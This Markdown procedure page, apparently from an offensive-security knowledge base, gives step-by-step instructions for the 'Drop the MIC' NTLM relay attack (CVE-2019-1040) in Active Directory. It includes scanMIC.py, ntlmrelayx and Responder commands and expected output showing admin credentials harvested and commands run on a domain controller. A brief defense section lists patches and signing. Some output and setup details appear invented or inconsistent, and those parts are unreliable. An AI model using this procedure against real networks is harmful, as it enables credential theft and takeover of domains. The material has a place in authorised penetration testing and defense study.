---
type: procedure
description: >-
  Exploit CVE-2019-1040 to bypass NTLM MIC checks and perform authentication
  relaying for credential access and lateral movement in Active Directory
  environments.
verified: true
submitted: false
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploitation for Credential Access|T1212 - Exploitation for
    Credential Access]]
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Drop the MIC]]'
  - '[[tags/Man-in-the-Middle attacks & relaying]]'
commands:
  - '[[commands/scan-for-cve-2019-1040-vulnerability]]'
  - '[[commands/setup-ntlmrelayx-for-smb-relay]]'
platforms:
  - Windows
tools:
  - '[[tools/Impacket]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Drop-the-MIC-NTLM-Relay-Attack

## Summary

The Drop the MIC attack leverages CVE-2019-1040, a vulnerability in the Windows NTLM implementation, to bypass the Message Integrity Code (MIC) validation during authentication relaying. This allows attackers to relay NTLM authentication from a vulnerable server to a target service (e.g., SMB on a domain controller), enabling unauthorized access, credential theft, and lateral movement without triggering integrity checks.

## Description

In Active Directory environments, NTLM authentication includes a MIC to verify message integrity. CVE-2019-1040 (patched in Windows updates post-2019) allows attackers to manipulate the MIC field, enabling successful relaying of authentication attempts. The attack requires positioning between a client and a vulnerable Windows server (e.g., via ARP poisoning or LLMNR/NBT-NS poisoning), verifying the target's vulnerability, setting up a relay server, and coercing authentication to the vulnerable system. This technique is particularly effective against unpatched Windows servers (2016/2019) and can lead to domain admin access if relayed to high-privilege services. It targets Kerberos/NTLM hybrid environments and assumes the attacker has low-privilege domain credentials for initial positioning.

## Requirements

1. Valid domain credentials (DOMAIN/USERNAME:PASSWORD) with network access to the target vulnerable server.
2. Network adjacency or ability to spoof traffic (e.g., via Responder for poisoning) to intercept authentication attempts.
3. Installed Impacket suite, including custom scripts like scanMIC.py for vulnerability checking.
4. Target environment: Unpatched Windows Server 2008-2019 with NTLM enabled; services like SMB (445) on relay targets (e.g., DC).

## Defense

- Apply Microsoft patches for CVE-2019-1040 (KB4507469 and later).
- Disable NTLM where possible; enforce LDAP signing and SMB signing.
- Implement network segmentation and monitor for anomalous authentication patterns (e.g., via Windows Event Logs 4624/4768).
- Use Extended Protection for Authentication (EPA) and tools like Microsoft ATA for anomaly detection.

## Objectives

1. Verify target vulnerability to CVE-2019-1040 for feasible relaying.
2. Relay NTLM authentication to extract credentials or gain shell access on target services.
3. Achieve lateral movement or privilege escalation in the domain.

## Instructions

### Step 1: Verify Target Vulnerability

**Context**: Before attempting the relay, confirm the target server is vulnerable to CVE-2019-1040 by attempting an authentication that bypasses the MIC check. This step uses domain credentials to probe the server without alerting if patched.

**Command** ([[commands/scan-for-cve-2019-1040-vulnerability]]):
```bash
python2 scanMIC.py '$_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET'
```

> This command executes the scanMIC.py script to test NTLM authentication against the target. Replace placeholders with actual values (e.g., DOMAIN=corp.local, USERNAME=user, PASSWORD=pass, TARGET=192.168.1.10). If vulnerable, it indicates successful MIC bypass; otherwise, authentication is rejected. Run from a Linux/Kali machine with Impacket installed.

**Expected Output**:
```
[*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth
[*] Target 192.168.1.10 is vulnerable to CVE-2019-1040 (authentication succeeded without MIC)
```

### Step 2: Set Up NTLM Relay Server

**Context**: Configure a relay server to capture and forward NTLM authentication attempts from the vulnerable target to a high-value service, such as SMB on a domain controller. This step prepares for interception without yet triggering traffic.

**Command** ([[commands/setup-ntlmrelayx-for-smb-relay]]):
```bash
python ntlmrelayx.py -t smb://$_TARGET_DC --no-http-server --no-smb-server -smb2support -i
```

> Launch ntlmrelayx from Impacket to relay to the target DC's SMB share. The -t specifies the relay destination (e.g., smb://dc01.corp.local), --no-http-server disables unnecessary listeners, -smb2support enables SMBv2/3 compatibility, and -i provides an interactive shell on success. Position your machine to intercept traffic (e.g., via ARP spoofing).

**Expected Output**:
```
Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation
[*] Servers started, waiting for connections
```

### Step 3: Trigger Authentication and Relay

**Context**: Coerce the vulnerable server to authenticate to your relay listener, which will forward the request to the target service. This can be done via LLMNR/NBT-NS poisoning with Responder or PetitPotam for coercion.

**Instructions**: Start Responder.py to poison name resolution:
```bash
python Responder.py -I $_INTERFACE -wrd
```
Then, from a client or the vulnerable server, attempt a connection (e.g., \fake-share) that resolves to your attacker IP, triggering NTLM auth. Monitor ntlmrelayx for relayed connections.

**Expected Output**: Successful relay shows in ntlmrelayx logs:
```
[*] SMB challenge/negotiate received from vulnerable-server
[+] Credentials for 'DOMAIN\admin':hash123 harvested!
[*] CommandStager: Initial command sent successfully to DC
```

**Success Indicators**:
- Vulnerability scan confirms MIC bypass.
- Relay server captures and forwards auth without rejection.
- Access granted to target service (e.g., SMB share or shell on DC).
